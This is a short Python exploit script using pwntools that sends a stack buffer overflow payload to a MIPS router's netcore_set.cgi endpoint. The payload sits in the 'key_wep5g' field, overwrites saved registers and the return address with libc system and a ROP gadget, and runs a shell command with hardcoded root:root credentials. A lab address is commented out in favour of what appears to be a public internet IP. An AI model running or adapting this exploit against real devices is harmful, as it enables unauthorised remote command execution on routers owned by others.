import requests
from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)
# url = "http://192.168.5.12/cgi-bin-igd/netcore_set.cgi"
url = "http://45.178.100.15:8080/cgi-bin-igd/netcore_set.cgi"

libc_base = 0x77f7b000
system = 0x0002A0F0
rop = 0x0001D17C
cmd = b'ls > /web/Config.tgz'

payload = b'A'*123
payload += b'BBBB' #s0
payload += b'CCCC' #s1
payload += p32(libc_base+system) #s2
payload += b'EEEE' #s3
payload += b'FFFF' #s4
payload += b'GGGG' #s5
payload += b'HHHH' #s6
payload += b'YYYY' #s7
payload += b'JJJJ' #s8
payload += p32(libc_base+rop) #ra
payload += b'L'*24+cmd


data = {"mode_name": "netcore_set", "wl_sec_set_5g": "ap", "sec_mode5g": "1", "key_wep5g": payload}
headers = {
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
    "Authorization": "Basic cm9vdDpyb290",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Host": "45.178.100.15:8080"
}

res = requests.post(url = url, headers = headers, data = data)

